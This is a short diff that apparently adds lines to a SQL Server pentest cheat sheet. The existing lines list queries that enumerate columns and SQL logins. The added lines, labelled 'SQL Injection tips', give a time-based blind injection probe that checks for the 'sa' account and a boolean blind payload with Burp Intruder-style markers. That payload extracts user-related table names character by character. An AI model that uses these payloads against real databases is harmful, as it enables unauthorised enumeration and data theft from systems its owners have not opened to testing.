@@ -17,3 +17,7 @@ SELECT * FROM INFORMATION_SCHEMA.COLUMNS
 
 #fecht all users
 SELECT * FROM sys.sql_logins
+
+#SQL Injection tips
+IF SYSTEM_USER='sa' WAITFOR DELAY '00:00:15'
+if (ascii(lower(substring((select top 1 name from sysobjects where xtype=char(85) and name like '%user%'),§1§,1)))=§100§)
